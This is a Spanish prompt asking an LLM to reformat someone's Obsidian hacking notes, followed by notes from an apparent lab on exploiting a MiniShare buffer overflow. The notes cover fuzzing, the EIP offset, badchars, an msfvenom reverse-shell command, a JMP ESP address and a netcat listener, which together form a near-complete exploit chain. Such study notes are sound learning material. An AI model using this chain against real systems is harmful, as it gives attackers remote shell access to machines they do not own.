---
Tema: "[[Buffer Overflow]]"
---

Embellecé y organizá mis apuntes de hacking en Obsidian usando Markdown (encabezados, listas, callouts, tablas, mermaid, bloques de código).  
Simplificá lo confuso, agregá ejemplos de comandos/técnicas. 
lo que este encerrado entre {indicaciones para LLM} son indicaciones para ti sobre lo que tienes que hacer en ese punto.
Respetá  OBLIGATORIAMENTE enlaces e imágenes.  
Objetivo: notas claras, técnicas y atractivas.  

Aqui va el texto:

---

## Inicio

se va a trabajar sobre [MiniShare](https://sourceforge.net/projects/minishare/) explotaremos eso, tiene vulnerabilidad de buffer obverflow

minishare te va a dar un servicio http por el puerto 80

algo que necesitamos es que ademas este habilitado el uso de [[telnet]] para poder trabajar sobre el script de pyhton

para eso en telnet te conectas de la siguiente manera

```sh
telnet <ip> <puerto>
```

aplicar `GET / HTTP/1.1` + enter + enter

eso se programara en el script


## Fase Fuzzing

alcarar qeu el bof ocurre en este punto:
-  `GET AAAAAAA... HTTP/1.1`

por lo que se empieza por descubrir donde estan los registros el `EIP` y el `ESP`
eso recordar el scritp se va a encontrar en `red_vault/scripts/buffer_overflow/lab2_MiniShare.py`

el servicio http explota cuando se le envian 1800 A (`\x41`)


ahora para saber donde esta realmente el limite del registro EIP recordar qeu debemos insertar un payload con un patron especifico para encontrar el limite con la ayuda de [[Inmunnity Debugger]]

eso lo podemos ahcer generando un payload con una lib de metasploit. 
```sh
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 1800
```

te va a devolver bytes en hexadecimal con un patron especifico para que puedas detectar en que momento esta el limite del registro EIP.

en este caso se puede ver en el momento donde se rompe

![[Pasted image 20260107104952.png]]

en ese caso es `0x36684335`

por lo que buscamos la longitud con 

```sh
/usr/share/metasploit-framework/tools/exploit/pattern_offset.rb -q 0x36684335
```

te va a dar una longitud de **1787** lo cual es clave

si quieres probar que llegaste corretamente puedes hacer

```python
offset = 1787
before_eip = b'A'*offset
eip= b'B'*4

payload = before_eip + eip
```

## Fase Badchars

En este caso el EIP esta al lado del ESP. por lo que ya podemos empezar con los badchars.
en este caso lo haremos desde [[Inmunnity Debugger]] con [[mona (python)]]

```python
!mona bytearray -cpb "\x00"
```

> recordar qeu este crea todas las configuraciones de `\x_ _`, es decir, de la `\x00` a `\xff`

luego eso va a quedar en una carpeta definida en un .txt. quedaria tranferirse de alguna forma ese archivo a la mquina atacante, en el lab se lo hace por [[SMB - Transferencia de archivos por SMB]]

y ahi es cuestion de ir probando, ya que esa secuencia estara metida dentro del stack.

Luego de volver a probar quedaria ir viendo en el dump de las seccion es de memoria si falta algo o se sallta. o sino se puede hacer

```python
!mona compare \xESP -f RUTA_PARA_EL_OUTPUT.bin
```

> \xESP debe ser la direccion del Registro ESP

ahi nos damos cuenta que ademas del `\x00` falta el `\x0d`


## Fase Shellcode

como ya sabemos que son esos dos poruqe no hay mas badchars generamos entonces el shellcode con [[msfvenom]]

```shell
msfvenom -p windows/shell_reverse_tcp --platform windows -a x86 LHOST=IP_ATACANTE LPORT=PUERTO_ATACANTE -e x86/shikata_ga_nai EXITFUNC=thread -f c -b '\x00\x0d'
```

con ese reverse tcp solo aplicamos en el script y nos quedaria la variable para el buffer overflow de la siguiente manera

```python
OFFSET_EIP = 1787
before_eip = b'A'*OFFSET_EIP
eip= b'B'*4

# esto es a modo de ejemplo
badchars = (b"\x00\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f")
shellcode == b"\xb8\x1d\x7e\x3f\x1e\xda\xd6\xd9\x74\x24\xf4\x5a\x31\xc9\xb1"
nops = b'\x90' * 16  # NOP sled

payload = before_eip + eip + nops + shellcode
```


## Fase Encontrar Instruccion de Salto (JMP ESP)

lo que tenemos que hacer es cargar una direccion en la variable eip. pero que esa direccion sea una instruccion de salto. como es una direccion y estando en una arquitectura de x86 debemos aplicar [[BOF - Little Endian]]

primero debemos saber como es la direccion de instruccion de salto,  eso lo podemos hacer averiguendolo de la sig manera

```shell
/usr/share/metasploit-framework/tools/exploit/nasm_shell.rb
```
y escribimos 
`nasm > jmp ESP`

nos da -> `FFE4`


ahora si abrimos 
```python
!mona modules
```
obtenemos una sola libreria o modulo que cumple con todo en false

![[Pasted image 20260107114439.png]]

se trata del binario `minishare.exe`, luego en ese mismo debemos buscar la sig instruccion asi encontraremos la direccion donde esta esa bendita instruccion de salto hacia la pila

```python
!mona find -s "\xFF\xE4" -m minishare.exe
```

si no la encuentra puedes probar con 

```python
!mona find -s "JMP ESP"
```

te dara instrucciones, hay que agarrar una que no tenga los badchars como `0x752c3cda`

### Fase explotacion

finalmente ajustar la variable `esp` del script cno el little endian

```python
eip= pack("<L", 0x752c3cda)
```

ahi el eip aplica la direccion dondes esta la instruccion JMP ESP,  por lo que quedaria del lado de atacante ponerse en escucha antes de eejcutar el script con [[rlwrap]]

```sh
rlwarp nc -nlvp 443
```

y luego el script `python lab2_MiniShare.py`
